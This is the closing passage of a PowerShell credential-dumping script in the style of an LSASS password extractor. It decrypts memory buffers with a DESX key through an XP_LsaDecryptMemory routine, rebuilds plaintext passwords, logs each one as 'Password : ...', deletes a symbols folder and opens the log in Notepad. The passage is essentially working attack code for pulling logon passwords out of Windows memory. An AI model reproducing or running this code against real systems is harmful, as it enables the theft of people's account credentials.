                    $String = $Encoding.GetString($dec)
                    $conversion = [Char][Convert]::ToInt32($currenthex,16)    
                    $cipherToDecrypt = $cipherToDecrypt + $String
                    $loopcount = $loopcount + 1
                }
            
                $passwordDec = XP_LsaDecryptMemory $DESXKeyHex $g_Feedback $cipherToDecrypt
                $passwordDecSplitted = $passwordDec -split " "
                $passwordDecSplitted = $passwordDecSplitted -replace " ",""
                $password = ""
                foreach($letter in $passwordDecSplitted){
                    if([int]$letter -lt 98182){
                        $password = $password + [char][int]$letter
                    }
                }            
                        
                Write-Log -streamWriter $global:streamWriter -infoToLog "Password : $password"
            }
            $i++
        }        
    }
}
Write-Progress -Activity "Removing symbols" -status "Running..." -id 1 
Remove-Item -Recurse -Force c:\symbols
Write-Progress -Activity "Write informations in the log file" -status "Running..." -id 1
End-Log -streamWriter $global:streamWriter
notepad $logPathName
